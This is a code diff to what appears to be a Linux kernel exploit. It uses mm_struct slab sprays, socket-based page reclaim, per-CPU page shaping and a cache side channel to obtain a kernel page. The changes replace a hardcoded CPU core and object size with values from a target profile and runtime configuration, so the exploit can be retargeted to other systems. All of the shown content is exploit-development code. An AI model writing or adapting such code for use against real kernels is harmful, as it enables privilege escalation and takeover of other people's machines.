@@ -218,7 +218,7 @@ pid_t clone_child(void) {
     if (getppid() == 1) {
       _exit(0);
     }
-    pin_to_core(CORE);
+    pin_to_core(runtime_config_snapshot().main_cpu);
     for (;;) {
       pause();
     }
@@ -482,7 +482,8 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
    * leaked one mm_struct per stage and progressively poisoned later sprays. */
   close_reclaim_sockets();
   cleanup_page_prepare_state();
-  mm_objs_per_slab = ORDER3_SIZE / mm_struct_sz();
+  mm_objs_per_slab = ORDER3_SIZE /
+          target_profile_mm_struct_sz(&g_target_profile, MM_STRUCT_SZ);
   prepare_ctxs();
 
   g_heap_context.skb_buffer = std::make_unique<unsigned char[]>(SKB_SEND_SIZE);
@@ -500,7 +501,9 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ghostlock::KernelSnitchOwner snitch = ghostlock::KernelSnitchOwner::create(
-      mm_struct_sz(), MM_ORDER, cpu_count, kernelsnitch_collisions(), 0);
+      target_profile_mm_struct_sz(&g_target_profile, MM_STRUCT_SZ),
+      MM_ORDER, cpu_count, kernelsnitch_collisions(), 0,
+      runtime_config_snapshot().main_cpu);
   /* The forked leak child borrows the shared mmap context through this
    * compatibility alias; the owner remains the only releaser. */
   auto clear_snitch_alias =
@@ -646,7 +649,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
 
   SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
 
-  pin_to_core(CORE);
+  pin_to_core(runtime_config_snapshot().main_cpu);
   sched_yield();
   sched_yield();
   sched_yield();
